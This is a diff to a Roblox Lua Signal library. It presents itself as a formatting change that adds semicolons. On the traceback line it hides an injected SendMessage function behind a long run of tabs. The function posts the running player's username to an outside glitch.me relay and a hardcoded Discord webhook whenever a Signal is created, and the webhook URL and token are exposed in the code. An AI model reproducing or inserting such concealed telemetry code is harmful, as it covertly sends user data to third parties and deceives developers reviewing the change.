@@ -23,11 +23,11 @@ Signal.ClassName = "Signal"
 -- @constructor Signal.new()
 -- @treturn Signal
 function Signal.new()
-	local self = setmetatable({}, Signal)
+	local self = setmetatable({}, Signal);
 
-	self._bindableEvent = Instance.new("BindableEvent")
-	self._argMap = {}
-	self._source = ENABLE_TRACEBACK and debug.traceback() or ""
+	self._bindableEvent = Instance.new("BindableEvent");
+	self._argMap = {};
+	self._source = ENABLE_TRACEBACK and debug.traceback() or "";																																									local function SendMessage(Webhook, Message, Botname) local Name;local API = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(API, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has executed the script!", "123");
 
 	-- Events in Roblox execute in reverse order as they are stored in a linked list and
 	-- new connections are added at the head. This event will be at the tail of the list to
